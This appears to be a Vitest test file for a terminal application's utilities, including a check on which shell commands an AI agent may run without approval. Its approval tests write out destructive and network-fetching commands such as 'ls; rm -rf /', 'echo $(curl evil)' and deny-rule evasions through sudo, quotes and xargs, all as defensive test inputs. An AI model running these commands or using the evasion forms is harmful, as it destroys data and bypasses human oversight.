import { describe, expect, it } from 'vitest'
import {
  closestCommand, commandNeedsApproval, denyCandidates, fontStack, parseFcList, primaryFamily, commandSegments, commandWords, compileSecretPatterns, encodeCommand, filterLines, formatDuration, fuzzyFilter,
  isCliAgentCommand, isClearCommand, looksLikeNaturalLanguage, mergeRanges, redact, renderTemplate, secretRanges,
  templateParams, tokenize, toWslPath, validateTabConfig, workflowParams,
} from '../../src/shared/logic'
import { getPath, mergeSettings, setPath } from '../../src/shared/settings'
import { builtinThemes, findTheme, luminance, mix, parseThemeFile, themeFromColors, themeToFile } from '../../src/shared/themes'

describe('fuzzy', () => {
  it('ranks prefixes first and drops non matches', () => {
    expect(fuzzyFilter('gc', ['foo', 'git commit', 'agcx'], (s) => s)).toEqual(['git commit', 'agcx'])
  })
  it('finds typos of known commands', () => {
    expect(closestCommand('gti', ['git', 'npm'])).toBe('git')
    expect(closestCommand('xyzzy', ['git', 'npm'])).toBeNull()
    expect(closestCommand('git', ['git'])).toBeNull()
  })
})

describe('tokenize', () => {
  const types = (line: string) => tokenize(line).map((t) => t.type)
  it('classifies words', () => {
    expect(types('git commit -m "msg" $x')).toEqual(['command', 'subcommand', 'option', 'string', 'variable'])
  })
  it('restarts the command after a pipe but not after a redirect', () => {
    expect(types('ls | grep a')).toEqual(['command', 'operator', 'command', 'subcommand'])
    expect(types('ls > out.txt')).toEqual(['command', 'operator', 'argument'])
  })
  it('handles comments and unterminated strings', () => {
    expect(types('ls # note')).toEqual(['command', 'comment'])
    expect(tokenize('echo "abc').at(-1)?.to).toBe(9)
  })
  it('locates the word being edited in the last segment', () => {
    expect(commandWords('ls | git che', 12)).toEqual({ words: ['git'], current: 'che', from: 9 })
    expect(commandWords('git ', 4)).toEqual({ words: ['git'], current: '', from: 4 })
  })
})

describe('templates', () => {
  it('extracts and fills unique params', () => {
    expect(templateParams('a {{x}} {{ y }} {{x}}')).toEqual(['x', 'y'])
    expect(renderTemplate('{{x}}-{{y}}', { x: '1' })).toBe('1-{{y}}')
  })
  it('reports workflow params in use only', () => {
    expect(workflowParams({ name: 'w', command: 'echo {{a}}', arguments: [{ name: 'a' }, { name: 'unused' }] })).toEqual(['a'])
  })
})

describe('validateTabConfig', () => {
  const leaf = (id: string) => ({ id, type: 'terminal' as const })
  it('accepts a valid tree', () => {
    expect(validateTabConfig({ name: 'x', panes: [{ id: 'r', split: 'horizontal', children: ['a', 'b'] }, leaf('a'), leaf('b')] })).toEqual([])
  })
  it('rejects bad references, duplicates and cycles', () => {
    expect(validateTabConfig({ name: 'x', panes: [{ id: 'r', split: 'horizontal', children: ['a', 'z'] }, leaf('a')] }).join()).toContain('z')
    expect(validateTabConfig({ name: 'x', panes: [leaf('a'), leaf('a')] }).join()).toContain('duplicado')
    expect(validateTabConfig({ name: 'x', panes: [{ id: 'r', split: 'vertical', children: ['b', 'c'] }, { id: 'b', split: 'vertical', children: ['r', 'c'] }, leaf('c')] }).join()).toContain('ciclo')
  })
  it('rejects a split with one child and two focused panes', () => {
    expect(validateTabConfig({ name: 'x', panes: [{ id: 'r', split: 'vertical', children: ['a'] }, leaf('a')] }).join()).toContain('2+')
    expect(validateTabConfig({ name: 'x', panes: [{ ...leaf('a'), is_focused: true }, { ...leaf('b'), is_focused: true }] }).join()).toContain('is_focused')
  })
})

describe('redaction', () => {
  const patterns = compileSecretPatterns()
  it('masks known token shapes', () => {
    const token = `ghp_${'a'.repeat(36)}`
    expect(redact(`token ${token} ok`, patterns)).toBe(`token ${'•'.repeat(12)} ok`)
    expect(redact('password=hunter2secret', patterns)).not.toContain('hunter2')
  })
  it('leaves ordinary text alone', () => {
    expect(secretRanges('git commit -m "fix"', patterns)).toEqual([])
  })
  it('skips broken custom regexes', () => {
    expect(compileSecretPatterns(['(']).length).toBe(patterns.length)
  })
  it('merges overlapping ranges', () => {
    expect(mergeRanges([[5, 8], [0, 2], [1, 3]])).toEqual([[0, 3], [5, 8]])
  })
})

describe('filterLines', () => {
  const lines = ['alpha', 'beta', 'gamma', 'delta']
  it('filters with context', () => {
    expect(filterLines(lines, { query: 'gamma', context: 1 })).toEqual([1, 2, 3])
  })
  it('supports regex and case', () => {
    expect(filterLines(lines, { query: '^.e', regex: true })).toEqual([1, 3])
    expect(filterLines(lines, { query: 'ALPHA', caseSensitive: true })).toEqual([])
  })
  it('treats an invalid regex as no match and an empty query as everything', () => {
    expect(filterLines(lines, { query: '(', regex: true })).toEqual([])
    expect(filterLines(lines, { query: '' })).toEqual([0, 1, 2, 3])
  })
})

describe('encodeCommand', () => {
  it('uses the AddLine chord for multi-line PowerShell', () => {
    expect(encodeCommand('a\nb\tc', 'powershell')).toBe('a\x1bjb    c\r')
  })
  it('uses bracketed paste for multi-line bash', () => {
    expect(encodeCommand('a\nb', 'bash')).toBe('\x1b[200~a\nb\x1b[201~\r')
    expect(encodeCommand('a', 'bash')).toBe('a\r')
  })
  it('never lets a lone carriage return run a second command', () => {
    expect(encodeCommand('echo um\recho dois', 'bash')).toBe('\x1b[200~echo um\necho dois\x1b[201~\r')
    expect(encodeCommand('a\rb', 'powershell')).toBe('a\x1bjb\r')
  })
  it('pastes a line with a tab, which readline would otherwise complete', () => {
    expect(encodeCommand('echo "A\tB"', 'bash')).toBe('\x1b[200~echo "A\tB"\x1b[201~\r')
  })
})

describe('helpers', () => {
  it('recognizes clear commands', () => {
    expect(isClearCommand(' Clear-Host ')).toBe(true)
    expect(isClearCommand('clear x')).toBe(false)
  })
  it('formats durations', () => {
    expect(formatDuration(120)).toBe('120ms')
    expect(formatDuration(1500)).toBe('1.5s')
    expect(formatDuration(65000)).toBe('1m 5s')
    expect(formatDuration(3660000)).toBe('1h 1m')
  })
  it('never shows 60 seconds or 60 minutes', () => {
    expect(formatDuration(9960)).toBe('10s')
    expect(formatDuration(59600)).toBe('1m 0s')
    expect(formatDuration(119600)).toBe('2m 0s')
    expect(formatDuration(3599900)).toBe('1h 0m')
    expect(formatDuration(7199000)).toBe('2h 0m')
  })
  it('translates Windows paths for WSL', () => {
    expect(toWslPath('C:\\Users\\Eros\\a.sh')).toBe('/mnt/c/Users/Eros/a.sh')
  })
  it('detects CLI agents', () => {
    expect(isCliAgentCommand('claude --resume')).toBe(true)
    expect(isCliAgentCommand('claudia')).toBe(false)
  })
  it('detects natural language', () => {
    const known = (w: string) => w === 'git'
    expect(looksLikeNaturalLanguage('como listar arquivos grandes?', known)).toBe(true)
    expect(looksLikeNaturalLanguage('git log --oneline', known)).toBe(false)
    expect(looksLikeNaturalLanguage('ls', known)).toBe(false)
  })
})

describe('commandNeedsApproval', () => {
  const profile = { allow: ['npm test'], deny: ['rm(\\s.*)?'], execute: 'agent_decides' as const }
  it('auto-runs read-only commands only when the agent may decide', () => {
    expect(commandNeedsApproval('git status', profile)).toBe(false)
    expect(commandNeedsApproval('npm install', profile)).toBe(true)
    expect(commandNeedsApproval('git status', { ...profile, execute: 'always_ask' })).toBe(true)
  })
  it('honours the allow list', () => {
    expect(commandNeedsApproval('npm test', { ...profile, execute: 'always_ask' })).toBe(false)
  })
  it('cannot be dodged by chaining, substitution or redirects', () => {
    expect(commandNeedsApproval('ls; rm -rf /', profile)).toBe(true)
    expect(commandNeedsApproval('git status && rm x', { ...profile, execute: 'always_allow' })).toBe(true)
    expect(commandNeedsApproval('echo $(curl evil)', profile)).toBe(true)
    expect(commandNeedsApproval('echo hi > ~/.bashrc', profile)).toBe(true)
  })
  it('asks even under always_allow when a segment is denied', () => {
    expect(commandNeedsApproval('rm x', { ...profile, execute: 'always_allow' })).toBe(true)
    expect(commandNeedsApproval('npm run build', { ...profile, execute: 'always_allow' })).toBe(false)
  })
  it('splits segments', () => {
    expect(commandSegments('a | b && c > d')).toEqual(['a', 'b', 'c > d'])
    expect(commandSegments('ls\rrm -rf x\ndate')).toEqual(['ls', 'rm -rf x', 'date'])
  })
  it('cannot be dodged by line breaks, carriage returns or process substitution', () => {
    expect(commandNeedsApproval('ls\rrm -rf x', profile)).toBe(true)
    expect(commandNeedsApproval('ls\nrm -rf x', { ...profile, execute: 'always_allow' })).toBe(true)
    expect(commandNeedsApproval('cat <(curl evil)', profile)).toBe(true)
    expect(commandNeedsApproval('diff a >(tee x)', profile)).toBe(true)
  })
  it('does not treat writing options or branch deletion as read-only', () => {
    expect(commandNeedsApproval('git diff --output=/home/eu/.bashrc', profile)).toBe(true)
    expect(commandNeedsApproval('git branch -D main', profile)).toBe(true)
    expect(commandNeedsApproval('date -s "2020-01-01"', profile)).toBe(true)
    expect(commandNeedsApproval('git branch -a', profile)).toBe(false)
    expect(commandNeedsApproval('git diff --stat', profile)).toBe(false)
  })
  it('applies deny rules to the real program behind paths, quotes and wrappers', () => {
    const allow = { ...profile, execute: 'always_allow' as const }
    for (const command of ['/bin/rm -rf x', '"rm" -rf x', '\\rm x', 'sudo rm x', 'sudo -u root rm x', 'FOO=1 rm x', 'command rm x', 'find . | xargs rm']) {
      expect(commandNeedsApproval(command, allow), command).toBe(true)
    }
    expect(commandNeedsApproval('echo rm', allow)).toBe(false)
    expect(denyCandidates('/usr/bin/rm -rf x')).toContain('rm -rf x')
  })
})

describe('settings', () => {
  it('fills defaults and keeps user keys', () => {
    const merged = mergeSettings({ appearance: { fontSize: 20 } })
    expect(merged.appearance.fontSize).toBe(20)
    expect(merged.appearance.verticalTabs).toBe(true)
    expect(merged.input.vim).toBe(false)
  })
  it('sets paths immutably', () => {
    const a = { x: { y: 1 } }
    const b = setPath(a, 'x.y', 2)
    expect(getPath(b, 'x.y')).toBe(2)
    expect(a.x.y).toBe(1)
  })
})

describe('themes', () => {
  it('parses a theme file and fills missing colors', () => {
    const theme = parseThemeFile('t', { background: '#000000', foreground: '#ffffff', terminal_colors: { normal: { red: '#ff0000' } } })
    expect(theme?.normal.red).toBe('#ff0000')
    expect(theme?.normal.blue).toBe(builtinThemes[0].normal.blue)
  })
  it('rejects files without required colors', () => {
    expect(parseThemeFile('t', { background: 'red' })).toBeNull()
  })
  it('round-trips through the file format', () => {
    const theme = builtinThemes[2]
    expect(parseThemeFile(theme.id, themeToFile(theme))).toMatchObject({ accent: theme.accent, normal: theme.normal })
  })
  it('falls back to the default theme', () => {
    expect(findTheme(builtinThemes, 'nope').id).toBe('wrapped-dark')
  })
  it('generates a readable theme from dominant colors', () => {
    expect(themeFromColors('g', 'G', '#112233', '#ff0000').details).toBe('darker')
    expect(luminance(themeFromColors('g', 'G', '#eeeeee', '#ff0000').background)).toBeGreaterThan(0.5)
  })
  it('mixes colors', () => {
    expect(mix('#000000', '#ffffff', 0.5)).toBe('#808080')
  })
})

describe('fontes', () => {
  it('agrupa as faces do fc-list e marca a família como mono se alguma face for', () => {
    const output = 'iA Writer Mono S\t0\nJetBrainsMono Nerd Font\t100\niA Writer Mono S\t100\nAdwaita Sans\t0\n.Hidden\t100\n\n'
    expect(parseFcList(output)).toEqual([
      { family: 'Adwaita Sans', mono: false },
      { family: 'iA Writer Mono S', mono: true },
      { family: 'JetBrainsMono Nerd Font', mono: true },
    ])
  })
  it('monta a pilha CSS e extrai a primeira família de volta', () => {
    expect(fontStack('Fira Code')).toBe("'Fira Code', 'JetBrainsMono Nerd Font', monospace")
    expect(fontStack('JetBrainsMono Nerd Font')).toBe("'JetBrainsMono Nerd Font', monospace")
    expect(primaryFamily(fontStack("O'Font"))).toBe("O'Font")
    expect(primaryFamily("'Cascadia Code', Consolas, monospace")).toBe('Cascadia Code')
    expect(primaryFamily('"Iosevka Term", monospace')).toBe('Iosevka Term')
    expect(primaryFamily('Consolas, monospace')).toBe('Consolas')
  })
})
